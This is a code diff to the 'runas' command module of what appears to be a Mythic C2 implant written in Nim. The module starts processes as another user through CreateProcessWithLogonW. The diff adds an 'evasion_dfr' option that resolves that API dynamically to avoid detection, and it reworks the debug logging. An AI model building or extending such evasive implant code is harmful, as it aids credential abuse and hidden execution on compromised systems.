@@ -4,7 +4,11 @@ import ../utils/strenc
 import std/[json, strformat]
 
 when defined(windows):
-  import winim/lean
+  when defined(evasion_dfr):
+    import winim/lean except CreateProcessWithLogonW
+    import ../utils/winapi
+  else:
+    import winim/lean
 
 proc runas*(taskId: string, params: JsonNode): JsonNode =
   ## Execute a process as another user using CreateProcessWithLogonW
@@ -19,7 +23,7 @@ proc runas*(taskId: string, params: JsonNode): JsonNode =
       let args = params[obf("args")].getStr()
       let netonly = params.getOrDefault(obf("netonly")).getBool(true)
       
-      debug &"[DEBUG] RunAs: {domain}\\{username} executing {program}"
+      debugLog "runas", &"RunAs: {domain}\\{username} executing {program}"
       
       var output = ""
       
@@ -51,11 +55,11 @@ proc runas*(taskId: string, params: JsonNode): JsonNode =
       let logonFlags: DWORD = if netonly: 0x2 else: 0x1
       let creationFlags: DWORD = CREATE_NEW_CONSOLE
       
-      debug &"[DEBUG] Calling CreateProcessWithLogonW"
-      debug &"[DEBUG] Domain: {domain}"
-      debug &"[DEBUG] Username: {username}"
-      debug &"[DEBUG] Command: {commandLine}"
-      debug &"[DEBUG] NetOnly: {netonly}"
+      debugLog "runas", &"Calling CreateProcessWithLogonW"
+      debugLog "runas", &"Domain: {domain}"
+      debugLog "runas", &"Username: {username}"
+      debugLog "runas", &"Command: {commandLine}"
+      debugLog "runas", &"NetOnly: {netonly}"
       
       # Call CreateProcessWithLogonW
       let createResult = CreateProcessWithLogonW(
@@ -109,7 +113,7 @@ proc runas*(taskId: string, params: JsonNode): JsonNode =
       CloseHandle(pi.hProcess)
       CloseHandle(pi.hThread)
       
-      debug &"[DEBUG] Process created successfully with PID {actualPid}"
+      debugLog "runas", &"Process created successfully with PID {actualPid}"
       
       return mythicSuccess(taskId, output)
       
